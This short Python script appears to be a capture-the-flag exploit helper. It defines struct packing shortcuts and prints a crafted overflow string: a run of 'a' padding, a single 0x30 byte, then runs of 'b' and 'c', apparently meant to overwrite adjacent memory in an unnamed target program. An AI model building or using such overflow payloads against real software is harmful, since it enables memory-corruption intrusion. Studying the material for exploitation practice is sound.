#!/usr/bin/env python

from __future__ import print_function
from functools import partial
import struct


p64 = partial(struct.pack, "<Q")
p32 = partial(struct.pack, "<I")
pr = partial(print, end="")


pr("a" * 0x28 + "\x30" + ' ' + "b" * 0x27 + ' ' + "c" * 0x27)
